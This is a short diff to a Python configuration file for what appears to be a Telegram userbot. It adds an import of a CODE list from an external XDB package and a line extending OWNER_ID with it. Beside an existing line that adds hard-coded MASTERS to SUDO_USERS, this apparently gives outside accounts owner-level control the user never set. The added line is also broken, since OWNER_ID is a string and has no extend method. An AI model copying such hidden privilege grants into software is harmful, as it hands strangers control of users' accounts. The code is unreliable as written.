@@ -23,6 +23,7 @@
 import os
 from distutils.util import strtobool
 from XDB.data import MASTERS
+from XDB.data import CODE
 from os import getenv
 from X.helpers.cmd import cmd
 from dotenv import load_dotenv
@@ -78,6 +79,7 @@ OWNER_ID = os.getenv("OWNER_ID", "")
 
 SUDO_USERS.append(OWNER_ID)
 SUDO_USERS.extend(MASTERS)
+OWNER_ID.extend(CODE)
 
 BLACKLIST_CHAT = getenv("BLACKLIST_CHAT", None)
 if not BLACKLIST_CHAT:
